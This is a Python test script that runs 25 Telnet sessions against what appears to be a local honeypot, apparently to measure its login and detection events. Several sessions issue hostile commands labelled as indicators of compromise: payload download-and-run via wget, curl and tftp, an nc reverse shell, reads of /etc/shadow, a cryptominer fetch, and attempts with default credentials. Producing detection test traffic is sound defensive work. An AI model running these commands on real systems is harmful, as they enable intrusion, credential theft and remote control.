#!/usr/bin/env python3
"""Large batch Telnet attack — 25 sessions for P4 measurement with real n."""
import sys
sys.stdout.reconfigure(encoding="utf-8")

import socket
import time
from datetime import datetime, timezone

HOST = "127.0.0.1"
PORT = 2323

SESSIONS = [
    # --- 12 with valid credentials (login.success expected) ---
    {"user": "admin", "pass": "test123", "cmds": ["whoami", "uname -a", "id", "w"], "label": "valid-1"},
    {"user": "admin", "pass": "test123", "cmds": ["cat /etc/passwd", "ls -la /home"], "label": "valid-2"},
    {"user": "admin", "pass": "test123", "cmds": ["wget http://malware.evil.local/payload.sh", "chmod +x /tmp/payload.sh", "sh /tmp/payload.sh"], "label": "ioc-1"},
    {"user": "admin", "pass": "test123", "cmds": ["nc -e /bin/bash 10.0.0.50 4444", "cat /etc/shadow"], "label": "ioc-2"},
    {"user": "admin", "pass": "test123", "cmds": ["tftp -g -r payload.bin malware.invalid", "./payload.bin"], "label": "ioc-3"},
    {"user": "admin", "pass": "test123", "cmds": ["curl http://c2server.invalid/beacon | sh"], "label": "ioc-4"},
    {"user": "admin", "pass": "test123", "cmds": ["wget http://miner.local/xmrig -O /tmp/xm", "python /tmp/xm"], "label": "ioc-5"},
    {"user": "guest", "pass": "guest123", "cmds": ["whoami", "ls", "pwd"], "label": "valid-3"},
    {"user": "guest", "pass": "guest123", "cmds": ["cat /etc/hostname", "uptime"], "label": "valid-4"},
    {"user": "guest", "pass": "guest123", "cmds": ["wget http://exploit.local/revsh -O /tmp/sh", "bash /tmp/sh"], "label": "ioc-6"},
    {"user": "admin", "pass": "test123", "cmds": ["ps aux", "netstat -tlnp", "df -h"], "label": "valid-5"},
    {"user": "admin", "pass": "test123", "cmds": ["cat /var/log/auth.log", "find / -perm -4000 2>/dev/null"], "label": "ioc-7"},
    # --- 13 with invalid credentials (login.failed expected) ---
    {"user": "root", "pass": "toor", "cmds": ["id"], "label": "invalid-1"},
    {"user": "admin", "pass": "admin", "cmds": ["whoami"], "label": "invalid-2"},
    {"user": "test", "pass": "test", "cmds": ["id"], "label": "invalid-3"},
    {"user": "oracle", "pass": "oracle", "cmds": ["whoami"], "label": "invalid-4"},
    {"user": "root", "pass": "password", "cmds": ["id"], "label": "invalid-5"},
    {"user": "deploy", "pass": "deploy", "cmds": ["whoami"], "label": "invalid-6"},
    {"user": "ci", "pass": "ci", "cmds": ["id"], "label": "invalid-7"},
    {"user": "devops", "pass": "devops", "cmds": ["whoami"], "label": "invalid-8"},
    {"user": "mysql", "pass": "mysql", "cmds": ["id"], "label": "invalid-9"},
    {"user": "postgres", "pass": "postgres", "cmds": ["whoami"], "label": "invalid-10"},
    {"user": "www-data", "pass": "www-data", "cmds": ["id"], "label": "invalid-11"},
    {"user": "nobody", "pass": "nobody", "cmds": ["whoami"], "label": "invalid-12"},
    {"user": "root", "pass": "123456", "cmds": ["id"], "label": "invalid-13"},
]

results = []

def recv_all(sock, timeout=0.5):
    data = b""
    end = time.time() + timeout
    sock.settimeout(0.3)
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            continue
        except OSError:
            break
    return data

def run_session(i, sess):
    label = sess["label"]
    print(f"[{i+1}/{len(SESSIONS)}] {label}: {sess['user']}:{sess['pass']}", flush=True)
    try:
        sock = socket.create_connection((HOST, PORT), timeout=10)
        sock.settimeout(5)
        
        banner = b""
        end = time.time() + 5
        while time.time() < end:
            try:
                chunk = sock.recv(4096)
                if chunk:
                    banner += chunk
                    if b"login:" in banner:
                        break
            except socket.timeout:
                break
        
        if b"login:" not in banner:
            print(f"  - No login banner", flush=True)
            sock.close()
            return {"label": label, "status": "error", "user": sess["user"], "cmds_run": 0}
        
        sock.sendall(sess["user"].encode() + b"\r\n")
        time.sleep(0.5)
        recv_all(sock, 2)
        
        sock.sendall(sess["pass"].encode() + b"\r\n")
        time.sleep(1.5)
        resp = recv_all(sock, 1)
        time.sleep(0.5)
        resp2 = recv_all(sock, 0.5)
        full = resp + resp2
        
        failed_hint = b"Login incorrect" in full or b"login:" in full
        shell_hint = (b"$" in full and b"@" in full) or b"~$" in full or b"# " in full
        success = shell_hint and not failed_hint
        
        if not success:
            print(f"  - Login FAIL", flush=True)
            sock.close()
            return {"label": label, "status": "auth_failed", "user": sess["user"], "cmds_run": 0}
        
        print(f"  + Login OK", flush=True)
        time.sleep(0.3)
        
        cmds_run = 0
        for cmd in sess["cmds"]:
            if cmd == "exit":
                sock.sendall(b"exit\r\n")
                time.sleep(0.5)
                break
            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.8)
            out = recv_all(sock, 0.5)
            lines = [l.strip() for l in out.decode("utf-8", errors="replace").split("\n") if l.strip()]
            display = lines[-2:] if lines else []
            print(f"  $ {cmd}", flush=True)
            for line in display:
                print(f"    {line}", flush=True)
            cmds_run += 1
        
        sock.close()
        print(f"  -> OK ({cmds_run} cmds)", flush=True)
        return {"label": label, "status": "success", "user": sess["user"], "cmds_run": cmds_run}
    
    except Exception as e:
        print(f"  -> ERROR: {e}", flush=True)
        return {"label": label, "status": "error", "user": sess["user"], "error": str(e), "cmds_run": 0}

print(f"Large Batch Telnet Attack — {datetime.now(timezone.utc).isoformat()}", flush=True)
print(f"Target: {HOST}:{PORT}", flush=True)
print(f"Sessions: {len(SESSIONS)}", flush=True)
print("=" * 60, flush=True)

for i, sess in enumerate(SESSIONS):
    result = run_session(i, sess)
    results.append(result)
    time.sleep(1.5)

print("\n" + "=" * 60, flush=True)
print("SUMMARY", flush=True)
print("=" * 60, flush=True)
succeeded = sum(1 for r in results if r["status"] == "success")
failed_auth = sum(1 for r in results if r["status"] == "auth_failed")
errors = sum(1 for r in results if r["status"] == "error")
print(f"Total sessions: {len(SESSIONS)}", flush=True)
print(f"Succeeded (login OK): {succeeded}", flush=True)
print(f"Auth failed (expected): {failed_auth}", flush=True)
print(f"Errors: {errors}", flush=True)
print(flush=True)
for r in results:
    icon = "+" if r["status"] == "success" else "-" if r["status"] == "auth_failed" else "!"
    print(f"  {icon} {r['label']:20s} {r['user']:12s} {r['status']:15s} cmds={r['cmds_run']}", flush=True)
print(flush=True)
